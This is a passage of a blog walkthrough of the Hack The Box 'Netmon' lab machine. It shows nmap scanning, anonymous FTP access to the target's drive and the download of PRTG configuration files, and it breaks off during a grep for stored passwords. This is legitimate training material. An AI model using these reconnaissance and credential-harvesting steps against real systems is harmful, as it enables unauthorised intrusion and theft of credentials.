box!\n","wordCount":"2873","inLanguage":"en","datePublished":"2023-06-01T15:00:00Z","dateModified":"2023-06-01T15:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/netmon/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Netmon - Walkthrough</h1><div class=post-meta><span title='2023-06-01 15:00:00 +0000 +0000'>June, 2023</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;2873 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#synopsis><strong>SYNOPSIS</strong></a></li><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#information-gathering><strong>INFORMATION-GATHERING</strong></a></li><li><a href=#search-for-credentials><strong>SEARCH-FOR-CREDENTIALS</strong></a></li><li><a href=#exploitation><strong>EXPLOITATION</strong></a></li><li><a href=#post-exploitation><strong>POST-EXPLOITATION</strong></a></li></ul></nav></div></details></div><div class=post-content><h2 id=synopsis><strong>SYNOPSIS</strong><a hidden class=anchor aria-hidden=true href=#synopsis>#</a></h2><p>Outlining the <strong>attack path</strong> demonstrated in this <strong>writeup</strong> is much easier through a picture rather than a description, since <strong>a picture is worth a thousand words</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/netmon/attack-path_netmon.png alt="Attack Path - Netmon" title="Attack Path - Netmon"></p><p>The aim of this walkthrough is to provide help with the <a href=https://app.hackthebox.com/machines/177 title=Netmon>Netmon</a> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out with finishing the <a href=https://app.hackthebox.com/tracks/Beginner-Track title=Beginner-Track>Beginner-Track</a> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Additionally - even though not required - it is possible to set a <strong>local</strong> variable (only available in the current <strong>shell</strong>) containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>Finally, a very simple and basic <strong>file structure</strong> used throughout this <strong>writeup</strong> for this particular <strong>pentest</strong>:</p><ul><li>1_recon &ndash;> information gathering, enumeration and scanning, active/passive recon</li><li>2_exploitation &ndash;> exploits, foothold, lateral movement</li><li>3_post-exploitation &ndash;> privilege-escalation, lateral movement, persistence</li></ul><p><strong>Generating it</strong> is can be done by the following <strong>one-liner</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir 1_recon<span class=p>;</span> mkdir 2_exploitation<span class=p>;</span> mkdir 3_post-exploitation
</span></span></code></pre></div><h2 id=information-gathering><strong>INFORMATION-GATHERING</strong><a hidden class=anchor aria-hidden=true href=#information-gathering>#</a></h2><p>We start out by a quick <strong>connection check</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>ping -c <span class=m>4</span> -n -R <span class=nv>$rhost</span> &gt; connection-test.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ping -c <span class=m>4</span> -n -R <span class=nv>$rhost</span> &gt; connection-test.txt
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat connection-test.txt 
</span></span><span class=line><span class=cl>PING 10.129.96.142 <span class=o>(</span>10.129.96.142<span class=o>)</span> 56<span class=o>(</span>124<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.96.142: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>12.0 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.96.142: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>11.5 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.96.142: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>12.1 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.96.142: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>4</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>11.9 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.129.96.142 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>4</span> packets transmitted, <span class=m>4</span> received, 0% packet loss, <span class=nb>time</span> 3004ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 11.544/11.853/12.056/0.191 ms
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>followed by the usual (service, script, top-ports) <em><strong>tcp</strong></em> <strong>scan</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>nmap -sV -sC -oN nmap-service-script-topports-scan <span class=nv>$rhost</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -sV -sC -oN nmap-service-script-topports-scan <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-06-01 21:22 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.96.142
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.075s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>995</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT    STATE SERVICE      VERSION
</span></span><span class=line><span class=cl>21/tcp  open  ftp          Microsoft ftpd
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  SYST: Windows_NT
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-anon: Anonymous FTP login allowed <span class=o>(</span>FTP code 230<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> 02-03-19  12:18AM                 <span class=m>1024</span> .rnd
</span></span><span class=line><span class=cl><span class=p>|</span> 02-25-19  10:15PM       &lt;DIR&gt;          inetpub
</span></span><span class=line><span class=cl><span class=p>|</span> 07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs
</span></span><span class=line><span class=cl><span class=p>|</span> 02-25-19  10:56PM       &lt;DIR&gt;          Program Files
</span></span><span class=line><span class=cl><span class=p>|</span> 02-03-19  12:28AM       &lt;DIR&gt;          Program Files <span class=o>(</span>x86<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> 02-03-19  08:08AM       &lt;DIR&gt;          Users
</span></span><span class=line><span class=cl><span class=p>|</span>_02-25-19  11:49PM       &lt;DIR&gt;          Windows
</span></span><span class=line><span class=cl>80/tcp  open  http         Indy httpd 18.1.37.13946 <span class=o>(</span>Paessler PRTG bandwidth monitor<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-title: Welcome <span class=p>|</span> PRTG Network Monitor <span class=o>(</span>NETMON<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_Requested resource was /index.htm
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: PRTG/18.1.37.13946
</span></span><span class=line><span class=cl><span class=p>|</span>_http-trane-info: Problem with XML parsing of /evox/about
</span></span><span class=line><span class=cl>135/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>445/tcp open  microsoft-ds Microsoft Windows Server <span class=m>2008</span> R2 - <span class=m>2012</span> microsoft-ds
</span></span><span class=line><span class=cl>Service Info: OSs: Windows, Windows Server <span class=m>2008</span> R2 - 2012<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   311: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2023-06-01T20:22:43
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: 2023-06-01T20:15:10
</span></span><span class=line><span class=cl><span class=p>|</span> smb-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   authentication_level: user
</span></span><span class=line><span class=cl><span class=p>|</span>   challenge_response: supported
</span></span><span class=line><span class=cl><span class=p>|</span>_  message_signing: disabled <span class=o>(</span>dangerous, but default<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 15.72 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>There are a couple of things to <strong>take away</strong> from this <strong>report</strong>:</p><ul><li><em><strong>ftp</strong></em> &ndash; <strong>anonymous login</strong> is allowed</li><li><strong>target</strong> is running a <em>Paessler PRTG bandwidth monitoring</em> tool</li><li><strong>vulnerable</strong> webserver &ndash;> (<em>Indy httpd 18.1.37.13946</em>) &ndash; possible <strong>directory traversal</strong>, <strong>XSS</strong>, <strong>SQL injection</strong></li><li>port 135, 139, 445 &ndash;> <em>Microsoft</em> protocols to enable communication between different computers mostly on the same network, but <strong>not exclusively</strong></li><li>os &ndash;> probably <em>Windows Server 2008 R2 - 2012</em></li><li><em><strong>disabled</strong></em> <strong>smb signing</strong> &ndash;> potential <strong>MITM</strong> attack</li></ul><p>Firing up our browser and heading over to the our <strong>target</strong>&rsquo;s webserver, we are welcomed with a <em><strong>NETMON</strong></em> <strong>login page</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/netmon/webpage.png alt=webpage title=webpage></p><p>Sadly, <strong>none</strong> of the <strong>default credentials</strong> we tried worked, not even - <em>prtgadmin:prtgadmin</em> -, so we <strong>move on</strong>.
Let&rsquo;s check out the <em><strong>ftp</strong></em> <strong>share</strong> by using <strong>anonymous access</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>ftp <span class=nv>$rhost</span> <span class=m>21</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ftp <span class=nv>$rhost</span> <span class=m>21</span>
</span></span><span class=line><span class=cl>Connected to 10.129.96.142.
</span></span><span class=line><span class=cl><span class=m>220</span> Microsoft FTP Service
</span></span><span class=line><span class=cl>Name <span class=o>(</span>10.129.96.142:root<span class=o>)</span>: anonymous 
</span></span><span class=line><span class=cl><span class=m>331</span> Anonymous access allowed, send identity <span class=o>(</span>e-mail name<span class=o>)</span> as password.
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl><span class=m>230</span> User logged in.
</span></span><span class=line><span class=cl>Remote system <span class=nb>type</span> is Windows_NT.
</span></span></code></pre></div><p>It looks like the <strong>whole primary drive</strong> was shared.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ftp command</span>
</span></span><span class=line><span class=cl>ls -al
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>ftp&gt; ls -al
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful.
</span></span><span class=line><span class=cl><span class=m>125</span> Data connection already open<span class=p>;</span> Transfer starting.
</span></span><span class=line><span class=cl>11-20-16  10:46PM       &lt;DIR&gt;          <span class=nv>$RECYCLE</span>.BIN
</span></span><span class=line><span class=cl>02-03-19  12:18AM                 <span class=m>1024</span> .rnd
</span></span><span class=line><span class=cl>11-20-16  09:59PM               <span class=m>389408</span> bootmgr
</span></span><span class=line><span class=cl>07-16-16  09:10AM                    <span class=m>1</span> BOOTNXT
</span></span><span class=line><span class=cl>02-03-19  08:05AM       &lt;DIR&gt;          Documents and Settings
</span></span><span class=line><span class=cl>02-25-19  10:15PM       &lt;DIR&gt;          inetpub
</span></span><span class=line><span class=cl>06-01-23  04:15PM            <span class=m>738197504</span> pagefile.sys
</span></span><span class=line><span class=cl>07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs
</span></span><span class=line><span class=cl>02-25-19  10:56PM       &lt;DIR&gt;          Program Files
</span></span><span class=line><span class=cl>02-03-19  12:28AM       &lt;DIR&gt;          Program Files <span class=o>(</span>x86<span class=o>)</span>
</span></span><span class=line><span class=cl>12-15-21  10:40AM       &lt;DIR&gt;          ProgramData
</span></span><span class=line><span class=cl>02-03-19  08:05AM       &lt;DIR&gt;          Recovery
</span></span><span class=line><span class=cl>02-03-19  08:04AM       &lt;DIR&gt;          System Volume Information
</span></span><span class=line><span class=cl>02-03-19  08:08AM       &lt;DIR&gt;          Users
</span></span><span class=line><span class=cl>02-25-19  11:49PM       &lt;DIR&gt;          Windows
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl>ftp&gt;
</span></span></code></pre></div><p>After <strong>goofing around</strong> a bit, we come up empty handed and we are forced to resort to <strong>looking up</strong> the default directory for the <strong>NETMON</strong> <strong>configuration files</strong>. They should be at - <em>C:\ProgramData\Paessler\PRTG Network Monitor\data</em> - so let&rsquo;s head there.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>ftp&gt; <span class=nb>cd</span> programdata
</span></span><span class=line><span class=cl><span class=m>250</span> CWD <span class=nb>command</span> successful.
</span></span><span class=line><span class=cl>ftp&gt; ls
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful.
</span></span><span class=line><span class=cl><span class=m>125</span> Data connection already open<span class=p>;</span> Transfer starting.
</span></span><span class=line><span class=cl>12-15-21  10:40AM       &lt;DIR&gt;          Corefig
</span></span><span class=line><span class=cl>02-03-19  12:15AM       &lt;DIR&gt;          Licenses
</span></span><span class=line><span class=cl>11-20-16  10:36PM       &lt;DIR&gt;          Microsoft
</span></span><span class=line><span class=cl>02-03-19  12:18AM       &lt;DIR&gt;          Paessler
</span></span><span class=line><span class=cl>02-03-19  08:05AM       &lt;DIR&gt;          regid.1991-06.com.microsoft
</span></span><span class=line><span class=cl>07-16-16  09:18AM       &lt;DIR&gt;          SoftwareDistribution
</span></span><span class=line><span class=cl>02-03-19  12:15AM       &lt;DIR&gt;          TEMP
</span></span><span class=line><span class=cl>11-20-16  10:19PM       &lt;DIR&gt;          USOPrivate
</span></span><span class=line><span class=cl>11-20-16  10:19PM       &lt;DIR&gt;          USOShared
</span></span><span class=line><span class=cl>02-25-19  10:56PM       &lt;DIR&gt;          VMware
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl>ftp&gt; <span class=nb>cd</span> paessler<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=m>250</span> CWD <span class=nb>command</span> successful.
</span></span><span class=line><span class=cl>ftp&gt; ls
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful.
</span></span><span class=line><span class=cl><span class=m>125</span> Data connection already open<span class=p>;</span> Transfer starting.
</span></span><span class=line><span class=cl>06-01-23  04:25PM       &lt;DIR&gt;          PRTG Network Monitor
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl>ftp&gt; <span class=nb>cd</span> <span class=s2>&#34;PRTG Network Monitor&#34;</span>
</span></span><span class=line><span class=cl><span class=m>250</span> CWD <span class=nb>command</span> successful.
</span></span><span class=line><span class=cl>ftp&gt; ls -la
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful.
</span></span><span class=line><span class=cl><span class=m>125</span> Data connection already open<span class=p>;</span> Transfer starting.
</span></span><span class=line><span class=cl>06-01-23  04:25PM       &lt;DIR&gt;          Configuration Auto-Backups
</span></span><span class=line><span class=cl>06-01-23  04:25PM       &lt;DIR&gt;          Log Database
</span></span><span class=line><span class=cl>02-03-19  12:18AM       &lt;DIR&gt;          Logs <span class=o>(</span>Debug<span class=o>)</span>
</span></span><span class=line><span class=cl>02-03-19  12:18AM       &lt;DIR&gt;          Logs <span class=o>(</span>Sensors<span class=o>)</span>
</span></span><span class=line><span class=cl>02-03-19  12:18AM       &lt;DIR&gt;          Logs <span class=o>(</span>System<span class=o>)</span>
</span></span><span class=line><span class=cl>06-01-23  04:25PM       &lt;DIR&gt;          Logs <span class=o>(</span>Web Server<span class=o>)</span>
</span></span><span class=line><span class=cl>06-01-23  04:25PM       &lt;DIR&gt;          Monitoring Database
</span></span><span class=line><span class=cl>02-25-19  10:54PM              <span class=m>1189697</span> PRTG Configuration.dat
</span></span><span class=line><span class=cl>02-25-19  10:54PM              <span class=m>1189697</span> PRTG Configuration.old
</span></span><span class=line><span class=cl>07-14-18  03:13AM              <span class=m>1153755</span> PRTG Configuration.old.bak
</span></span><span class=line><span class=cl>06-01-23  04:25PM              <span class=m>1640740</span> PRTG Graph Data Cache.dat
</span></span><span class=line><span class=cl>02-25-19  11:00PM       &lt;DIR&gt;          Report PDFs
</span></span><span class=line><span class=cl>02-03-19  12:18AM       &lt;DIR&gt;          System Information Database
</span></span><span class=line><span class=cl>02-03-19  12:40AM       &lt;DIR&gt;          Ticket Database
</span></span><span class=line><span class=cl>02-03-19  12:18AM       &lt;DIR&gt;          ToDo Database
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl>ftp&gt;
</span></span></code></pre></div><p>Even though we did not find any <em>data</em> directory, this <strong>location</strong> seems promising. Especially the <strong>four</strong> - <em>PRTG</em> - files. Let&rsquo;s <strong>grab</strong> them.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ftp command</span>
</span></span><span class=line><span class=cl>get <span class=s2>&#34;PRTG Configuration.dat&#34;</span>
</span></span><span class=line><span class=cl>get <span class=s2>&#34;PRTG Configuration.old&#34;</span>
</span></span><span class=line><span class=cl>get <span class=s2>&#34;PRTG Configuration.old.bak&#34;</span>
</span></span><span class=line><span class=cl>get <span class=s2>&#34;PRTG Graph Data Cache.dat&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>ftp&gt; get <span class=s2>&#34;PRTG Configuration.dat&#34;</span>
</span></span><span class=line><span class=cl>local: PRTG Configuration.dat remote: PRTG Configuration.dat
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful.
</span></span><span class=line><span class=cl><span class=m>125</span> Data connection already open<span class=p>;</span> Transfer starting.
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl><span class=m>1189697</span> bytes received in 0.17 secs <span class=o>(</span>6.5802 MB/s<span class=o>)</span>
</span></span><span class=line><span class=cl>ftp&gt; get <span class=s2>&#34;PRTG Configuration.old&#34;</span>
</span></span><span class=line><span class=cl>local: PRTG Configuration.old remote: PRTG Configuration.old
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful.
</span></span><span class=line><span class=cl><span class=m>125</span> Data connection already open<span class=p>;</span> Transfer starting.
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl><span class=m>1189697</span> bytes received in 0.16 secs <span class=o>(</span>6.9145 MB/s<span class=o>)</span>
</span></span><span class=line><span class=cl>ftp&gt; get <span class=s2>&#34;PRTG Configuration.old.bak&#34;</span>
</span></span><span class=line><span class=cl>local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful.
</span></span><span class=line><span class=cl><span class=m>125</span> Data connection already open<span class=p>;</span> Transfer starting.
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl><span class=m>1153755</span> bytes received in 0.20 secs <span class=o>(</span>5.3845 MB/s<span class=o>)</span>
</span></span><span class=line><span class=cl>ftp&gt; get <span class=s2>&#34;PRTG Graph Data Cache.dat&#34;</span>
</span></span><span class=line><span class=cl>local: PRTG Graph Data Cache.dat remote: PRTG Graph Data Cache.dat
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful.
</span></span><span class=line><span class=cl><span class=m>125</span> Data connection already open<span class=p>;</span> Transfer starting.
</span></span><span class=line><span class=cl>WARNING! <span class=m>413</span> bare linefeeds received in ASCII mode
</span></span><span class=line><span class=cl>File may not have transferred correctly.
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl><span class=m>1640740</span> bytes received in 0.64 secs <span class=o>(</span>2.4399 MB/s<span class=o>)</span>
</span></span><span class=line><span class=cl>ftp&gt;
</span></span></code></pre></div><h2 id=search-for-credentials><strong>SEARCH-FOR-CREDENTIALS</strong><a hidden class=anchor aria-hidden=true href=#search-for-credentials>#</a></h2><p>The first results we get after we start <strong>looking</strong> for some leftover <strong>credentials</strong> is quite lengthy, and not easily readable.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>grep -i password *
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-vemiwsocpu<span class=o>]</span>─<span class=o>[</span>~/netmon/1_recon/findings<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ grep -i password *
</span></span><span class=line><span class=cl>PRTG Configuration.dat:            &lt;dbpassword&gt;
</span></span><span class=line><span class=cl>PRTG Configuration.dat:            &lt;/dbpassword&gt;
